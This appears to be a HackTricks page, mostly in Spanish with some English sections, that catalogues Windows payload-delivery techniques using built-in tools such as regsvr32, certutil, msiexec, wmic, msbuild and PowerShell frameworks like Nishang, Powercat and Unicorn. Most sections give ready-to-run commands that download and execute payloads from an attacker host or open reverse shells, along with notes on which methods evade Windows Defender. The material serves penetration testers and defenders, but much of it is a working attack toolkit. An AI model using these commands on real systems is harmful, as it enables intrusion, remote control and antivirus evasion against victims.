Regsvr32 is a Windows command-line utility used to register and unregister DLL files. It can also be used as a technique to execute arbitrary code on a target system. Metasploit, a popular penetration testing framework, provides a module called `regsvr32_command_delivery` that leverages this technique.

The `regsvr32_command_delivery` module generates a malicious DLL file and registers it using the regsvr32 utility. When the DLL is registered, the code within it is executed, allowing the attacker to gain control over the target system.

To use this module, follow these steps:

1. Set the payload to be delivered. This can be a reverse shell or any other payload supported by Metasploit.
2. Set the `LHOST` and `LPORT` options to specify the IP address and port of the attacker's machine.
3. Run the module.

Once the module is executed successfully, the attacker will have a reverse shell or the desired payload executed on the target system.

This technique can be effective in scenarios where the target system has restrictions on executing certain file types but allows the execution of DLL files. It can also be used to bypass security measures that may be in place.

It is important to note that the use of this technique may be detected by antivirus software or other security solutions. Therefore, it is recommended to use it in controlled environments or during authorized penetration testing activities.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Puedes descargar y ejecutar fácilmente un zombie Koadic utilizando el stager regsvr**

## Certutil

Descarga un archivo B64dll, descodifícalo y ejecútalo.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Descarga un archivo B64exe, descodifícalo y ejecútalo.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Detectado por el defensor**

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptografía.**

**Obtén recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendrás la recompensa después de que se verifique el error.

**Obtén experiencia en pentesting web3**\
¡Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus días de crecimiento.

**Conviértete en la leyenda del hacker web3**\
Gana puntos de reputación con cada error verificado y conquista la cima de la clasificación semanal.

[**Regístrate en HackenProof**](https://hackenproof.com/register) ¡comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft. It is commonly used to execute VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.

When it comes to using Cscript with Metasploit, there are several techniques that can be employed. One common approach is to use Cscript as a payload delivery method. This involves creating a malicious script that, when executed, will download and execute a Metasploit payload on the target system.

To accomplish this, you can use the `msfvenom` tool in Metasploit to generate a payload in a format that is compatible with Cscript. For example, you can create a VBScript payload using the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your IP address> LPORT=<your port> -f vbs > payload.vbs
```

This command will generate a VBScript payload that establishes a reverse TCP connection to your specified IP address and port. The payload will be saved in a file named `payload.vbs`.

Once you have the payload, you can create a malicious script that will download and execute it on the target system using Cscript. Here is an example of such a script:

```vbs
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", "http://<your IP address>/payload.vbs", False
objXMLHTTP.send

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("C:\Temp\payload.vbs", True)
objFile.Write objXMLHTTP.responseText
objFile.Close

Set objShell = CreateObject("WScript.Shell")
objShell.Run "C:\Windows\System32\cscript.exe C:\Temp\payload.vbs", 0
```

In this script, the `objXMLHTTP` object is used to download the payload from your specified IP address. The `objFSO` object is then used to create a text file and write the downloaded payload into it. Finally, the `objShell` object is used to execute the payload using Cscript.

To execute the script on the target system, you can use various methods such as social engineering, exploiting vulnerabilities, or using other techniques to trick the user into running the script.

Using Cscript with Metasploit can be an effective way to deliver and execute payloads on Windows systems. However, it is important to note that these techniques should only be used for authorized penetration testing and not for any malicious purposes.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Detectado por el defensor**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga útil escrita en disco: **caché local del cliente WebDAV**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Detectado por el defensor**

## **MSIExec**

Atacante
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Victima:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Detectado**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
Proceso que realiza una llamada de red: **wmic.exe**\
Carga útil escrita en disco: **caché local de IE**

Archivo xsl de ejemplo:
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
Extraído de [aquí](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

**No detectado**

**Puedes descargar y ejecutar muy fácilmente un zombie Koadic utilizando el stager wmic**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga escrita en disco: **caché local del cliente WebDAV**

Puedes utilizar esta técnica para evadir la lista blanca de aplicaciones y las restricciones de Powershell.exe. Se te solicitará una shell de PS.\
Simplemente descarga esto y ejecútalo: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**No detectado**

## **CSC**

Compila código C# en la máquina víctima.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Puedes descargar un shell inverso básico en C# desde aquí: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**No detectado**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga útil escrita en disco: **caché local del cliente WebDAV**

**No lo he intentado**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga escrita en disco: **caché local del cliente WebDAV**

**No lo he intentado**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Shells de Powershell

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

En la carpeta **Shells**, hay muchos shells diferentes. Para descargar y ejecutar Invoke-_PowerShellTcp.ps1_, haz una copia del script y añade al final del archivo:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Comienza a servir el script en un servidor web y ejecútalo en el equipo de la víctima:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender no lo detecta como código malicioso (aún, 3/04/2019).

**TODO: Verificar otros shells de nishang**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Descargar, iniciar un servidor web, iniciar el escucha y ejecutarlo en el extremo de la víctima:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
El Defender no lo detecta como código malicioso (aún, 3/04/2019).

**Otras opciones ofrecidas por powercat:**

Conexiones de shell, shell inversa (TCP, UDP, DNS), redirección de puertos, subir/descargar archivos, generar payloads, servir archivos...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Crea un lanzador de PowerShell, guárdalo en un archivo y descárgalo y ejecútalo.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Detectado como código malicioso**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Crea una versión en powershell de una puerta trasera de Metasploit utilizando unicornio.
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Inicia msfconsole con el recurso creado:
```
msfconsole -r unicorn.rc
```
Inicie un servidor web que sirva el archivo _powershell\_attack.txt_ y ejecute en la víctima:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Detectado como código malicioso**

## Más

[PS>Attack](https://github.com/jaredhaight/PSAttack) Consola de PS con algunos módulos ofensivos de PS precargados (cifrados)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) Consola de PS con algunos módulos ofensivos de PS y detección de proxy (IEX)

## Bibliografía

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptografía.**

**Obtén recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendrás la recompensa después de que se verifique el error.

**Obtén experiencia en pentesting web3**\
¡Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus días de crecimiento.

**Conviértete en la leyenda del hacker web3**\
Gana puntos de reputación con cada error verificado y conquista la cima de la clasificación semanal.

[**Regístrate en HackenProof**](https://hackenproof.com/register) ¡comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
